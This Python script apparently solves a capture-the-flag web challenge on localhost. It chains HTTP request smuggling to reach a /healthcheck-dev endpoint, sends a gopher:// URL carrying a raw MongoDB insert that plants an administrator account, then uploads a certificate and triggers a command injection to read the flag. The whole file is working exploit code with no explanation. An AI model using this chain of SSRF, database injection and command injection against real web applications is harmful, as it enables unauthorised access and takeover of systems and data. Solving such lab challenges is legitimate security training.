from urllib.parse import *
from pwn import *
import requests
import string
import random
import time
import os

URL = "http://localhost:1337"

s = requests.Session()
s.proxies.update({
    'http': 'http://localhost:8080'
})

def rd(size=10, chars=string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

def register():
    data = {
        'username': rd(),
        'password': rd()
    }
    s.post(f"{URL}/panel/register", data=data)
    return data

def login(data):
    s.post(f"{URL}/panel/login", data=data)

def gopher():
    t = '1f0100000c00000000000000dd07000000000000000a01000002696e73657274000600000075736572730004646f63756d656e747300a70000000330009f00000002757365726e616d6500090000006c6d61706c6d6170000270617373776f7264003d000000243261243130242f4b644853594a494861515442454a716b51484b656565636e6472666c2e4d393950314b4b55515653337975453358746135444b4700027065726d697373696f6e000e00000061646d696e6973747261746f7200075f69640065f1bcdda379db7e91116b47105f5f7600000000000000086f7264657265640001036c736964001e000000056964001000000004d713cc65a2604826975f3547863166620002246462000a000000706572636574726f6e0000'
    t = bytes.fromhex(t)
    x = quote(t)
    return f"gopher://127.0.0.1:27017/_{x}"


def req_smug(url):
    domain = URL.split("//")[1]
    ip, port = domain.split(":")
    r = connect(ip, int(port))

    nl = "\r\n"
    req2 = f"GET /healthcheck-dev?url={url} HTTP/1.0{nl}" \
            f"Host: {domain}{nl}" \
            f"Cookie: connect.sid={s.cookies['connect.sid']}{nl}" \
            f"{nl}"

    req1 = f"GET / HTTP/1.0{nl}" \
               f"Host: {domain}{nl}" \
               f": x{nl}" \
               f"Content-Length: {len(req2)}{nl}" \
               f"{nl}" \
               f"{req2}"
    
    r.send(req1.encode())
    r.close()

def add_cert():
    os.system("node gen_cert.js")
    data = {}
    with open("cert") as f:
        data.update({"pem": f.read()})
    with open("privKey") as f:
        data.update({"privKey": f.read()})
    with open("privKey") as f:
        data.update({"pubKey": f.read()})
    s.post(f"{URL}/panel/management/addcert", data=data)

def trigger_cmd_injection():
    s.get(f"{URL}/panel/management/dl-certs")

def get_flag():
    resp = s.get(f"{URL}/static/js/flag.js")
    print(resp.text)

if __name__ == '__main__':
    login(register())
    req_smug(gopher())
    time.sleep(2)
    login({'username': 'lmaplmap', 'password': 'password'})
    add_cert()
    trigger_cmd_injection()
    get_flag()
